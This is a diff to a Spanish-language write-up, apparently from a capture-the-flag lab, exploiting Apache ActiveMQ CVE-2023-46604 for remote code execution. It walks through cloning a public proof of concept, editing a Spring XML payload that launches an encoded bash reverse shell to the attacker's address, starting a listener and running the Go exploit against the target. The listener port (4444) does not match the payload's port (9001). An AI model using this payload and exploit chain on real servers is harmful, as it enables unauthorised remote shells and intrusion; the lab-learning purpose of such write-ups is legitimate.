@@ -83,5 +83,52 @@ Apache ActiveMQ® es el intermediario de mensajes basado en Java, multiprotocolo
 **Realizando una busqueda mas profunda descubri la vulnerabilidad CVE-2023-46604 de ActiveMQ con la version 5.15.15.**
 
 {% embed url="https://nvd.nist.gov/vuln/detail/CVE-2023-46604?ref=blog.ecoit.com.br" %}
-https://mvnrepository.com/artifact/org.apache.ac
-{% endembed %}
+
+{% embed url="https://mvnrepository.com/artifact/org.apache.activemq/apache-activemq/5.15.15" %}
+
+**La vulnerabilidad de trata de una ejecucion remota.**
+
+**En github existe el codigo para poder explotar esa vulnervilidad.**
+
+{% embed url="https://github.com/rootsecdev/CVE-2023-46604" %}
+
+**Se hace un git clone.**
+
+<figure><img src="../../../.gitbook/assets/Arch.png" alt=""><figcaption></figcaption></figure>
+
+**Se modifica el archivo poc-linux.xml.**
+
+````xml
+```xml
+<?xml version="1.0" encoding="UTF-8" ?>
+<beans xmlns="http://www.springframework.org/schema/beans"
+   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+   xsi:schemaLocation="
+ http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+        <constructor-arg>
+        <list>
+            <value>bash</value>
+            <value>-c</value>
+            <!-- This command will give a reverse shell on port 9001. HTML Entity Encoded. Change IP as needed -->
+            <value>bash -i &#x3E;&#x26; /dev/tcp/10.10.14.70/9001 0&#x3E;&#x26;1</value>
+        </list>
+        </constructor-arg>
+    </bean>
+</beans>
+
+```
+````
+
+**Iniciamos un servidor HTTP Python3 en segundo plano e iniciamos un oyente Netcat.**
+
+```
+python3 -m http.server &
+nc -lvvp 4444
+```
+
+**Luego se ejecuta el codigo.**
+
+```go
+go run main.go -i 10.10.11.243 -p 61616 -u http://10.10.14.70:8000/poc-linux.xml
+```
